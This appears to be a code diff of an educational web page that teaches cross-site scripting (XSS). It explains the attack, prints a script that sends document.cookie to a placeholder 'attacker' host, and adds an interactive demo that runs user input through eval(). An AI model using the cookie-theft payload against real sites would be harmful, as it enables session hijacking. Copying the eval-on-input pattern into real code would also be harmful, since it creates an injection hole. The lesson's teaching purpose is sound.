@@ -36,19 +36,30 @@ Last Modified       20 January 2014
 
         // Hide these sections until the user has progressed accordingly.
 
-        $("#demoXSS").hide();
+//        $("#introXSS").hide();
 
-        $("#explanationOfXSS").hide();
+        $("#demoXSS").hide();
 
         $("#exploitationOfXSS").hide();
 
         $("#exploitationFinished").hide();
 
+	$("#Success").hide();
+
 	$("#Done").click(function()
-		{$("#exploitationFinished").hide();$('#implementDemoComplete').fadeIn();});
+		{$("#exploitationOfXSS").hide();$("#exploitationFinished").fadeIn();$('#implementDemoComplete').fadeIn();});
 
-    });
-
+	$("#Display").click(function() {
+            var input = document.getElementById("userInput").value;
+            if (input.length === 0 || input.indexOf('alert(') < 0) {
+                alert("Please enter an alert like in the example"); // submitted input not an alert command
+            }
+            else{
+            eval(input);
+            $("#Success").fadeIn();
+            }
+	});
+});
 </script>
 
 
@@ -57,7 +68,7 @@ Last Modified       20 January 2014
 
 <div id="introXSS">
 
-    <p>To illustrate a possible way in which an attacker could insert malicious code as parameter values, we take the example below. A simple server-side script is used to display the latest comment on a website:</p>
+	<p>To illustrate a possible way in which an attacker could insert malicious code as parameter values, we take the example below. A simple server-side script is used to display the latest comment on a website:</p>
 
 	<p><code>print "&lt;html>" <br/>
 	print "Latest comment:" <br/>
@@ -68,19 +79,14 @@ Last Modified       20 January 2014
 	The script assumes that a comment consists only of text. However, since the user input is included directly, an attacker could submit this comment: "<\script>...<\/script>". Any user visiting the page would now receive the following response:
 	</p>
 
-	<p><code>&lt;html> <br/>
+	<p><code>&lt;html> <br/>a
 	Latest comment: <br/>
 	&lt;script>...&lt;/script> <br/>
 	&lt;/html></code></p>
 
 	<p>When the user's browser loads the page, it will execute whatever JavaScript code is contained inside the &lt;script> tags. The attacker has now succeeded with his attack.</p>
 
-    <p>
-
-        <button onclick='$("#introXSS").hide(); $("#demoXSS").fadeIn();' id="Done">Next</button>
-
-    </p>
-
+        <button onclick='$("#introXSS").hide(); $("#demoXSS").fadeIn();'>Next</button>
 </div>
 
 
@@ -89,31 +95,33 @@ Last Modified       20 January 2014
 
 <div id="demoXSS">
 
-    <p>In this example, we will assume that the attacker's ultimate goal is to steal the victim's cookies by exploiting an XSS vulnerability in the website. This can be done by having the victim's browser parse the following HTML code:</p>
+	<p>In this example, we will assume that the attacker's ultimate goal is to steal the victim's cookies by exploiting an XSS vulnerability in the website. This can be done by having the victim's browser parse the following HTML code:</p>
 
-<p><code>
-&lt;script>window.location='http://attacker/?cookie='+document.cookie&lt;/script> <br/>
-</code></p>
+    <code>&lt;script>window.location='http://attacker/?cookie='+document.cookie&lt;/script></code><br/>
 
-<p>This script navigates the user's browser to a different URL, triggering an HTTP request to the attacker's server. The URL includes the victim's cookies as a query parameter, which the attacker can extract from the request when it arrives to his server. Once the attacker has acquired the cookies, he can use them to impersonate the victim and launch further attacks.</p>
+	<p><br/>This script navigates the user's browser to a different URL, triggering an HTTP request to the attacker's server. The URL includes the victim's cookies as a query parameter, which the attacker can extract from the request when it arrives to his server. Once the attacker has acquired the cookies, he can use them to impersonate the victim and launch further attacks.</p>
+
+    	<button onclick='$("#demoXSS").hide();$("#exploitationOfXSS").fadeIn();'>Next</button>
 
 </div>
 
-<!-- Unimplemented ------------------------------------------------------------->
-
-<!-- Demo Exploitation --------------------------------------------------------->
+<!-- Demo Exploitation -- --------------------------------------------------------->
 
 <div id="exploitationOfXSS">
 
-    <p>*Insert interactivity*</p>
 
-    <p>
+    <p>A simple way to show you how it works is to have a form that takes input and then executes it.</p>
 
-        <button onclick='
-                            $("#exploitationFinished").fadeIn();'>Next</button>
+	<p>Try entering an alert in the text box: (e.g. alert('hello world'))</p>
+	<input type="text" id="userInput"/>
+	<input type="submit" id="Display" value="Submit">
+<br/>
+	<div id="Success">
+        <br/>
+		<button id="Done">Done</button>
+	</div>
 
-    </p>
-
+    <br/>
 </div>
 
 
@@ -121,10 +129,10 @@ Last Modified       20 January 2014
 
 <div id="exploitationFinished">
 
-    <p>Well done - you have successfully exploited an internet application using XSS.</p>
+	<p>Well done - you have successfully exploited an internet application using XSS.</p>
 
-
-            <button id="Done">Done</button>
+    <p>This lesson should serve as an introduction into XSS and how it works. Specifically the need to check inputs from unreliable sources.</p>
+    <p>The simple way to prevent the attack in the example is to check the form input before it is executed.</p>
 
 </div>
 
